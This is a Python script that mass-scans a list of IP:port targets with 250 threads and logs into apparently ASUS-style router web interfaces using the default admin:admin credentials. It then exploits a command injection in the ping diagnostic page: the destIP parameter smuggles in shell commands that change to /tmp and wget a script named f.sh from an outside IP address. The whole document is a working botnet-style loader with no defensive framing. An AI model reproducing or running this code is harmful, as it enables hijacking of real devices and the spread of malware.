import requests
from concurrent.futures import ThreadPoolExecutor

def send_request(ip_port):
    base_url = f"http://{ip_port}"

    # First request to get SESSIONID
    headers_login = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36",
        "Connection": "close"
    }

    try:
        response_login = requests.get(base_url, headers=headers_login, verify=False, timeout=8)

        # Check if the 'Set-Cookie' header is present in the response
        if 'Set-Cookie' in response_login.headers:
            # Extract the value of SESSIONID from the 'Set-Cookie' header
            session_id_cookie = response_login.headers['Set-Cookie'].split(';')[0].split('=')[1]

            # Check if the response status code is 401
            if response_login.status_code == 401:
                print(f"Found device: {ip_port} - {session_id_cookie}")

                # Second request after login
                headers_after_login = {
                    "Host": f"{ip_port}",
                    "Cookie": f"SESSIONID={session_id_cookie}",
                    "Authorization": "Basic YWRtaW46YWRtaW4=",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36",
                    "Connection": "close"
                }

                # Additional request after login
                additional_url = f"{base_url}/cgi-bin/Main_Analysis_Content.asp?current_page=Main_Analysis_Content.asp&next_page=Main_Analysis_Content.asp&next_host={ip_port}&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&applyFlag=1&preferred_lang=EN&firmver=1.0.9.7&cmdMethod=ping&destIP=-c%3Bcd%20%2Ftmp%3Bwget%20htttp%3A%2F%2F91.92.254.84%2Ff.sh&pingCNT=5"
                
                response_after_login = requests.get(additional_url, headers=headers_after_login, verify=False, timeout=8)
                
                if response_after_login.status_code == 200:
                    print(f"Sent device: {ip_port}")

    except requests.RequestException:
        pass

def main():
    # Read IP:PORT from ips.txt file
    with open("ips.txt", "r") as file:
        ip_ports = file.read().splitlines()

    # Using ThreadPoolExecutor for parallel processing
    with ThreadPoolExecutor(max_workers=250) as executor:
        executor.map(send_request, ip_ports)

if __name__ == "__main__":
    main()
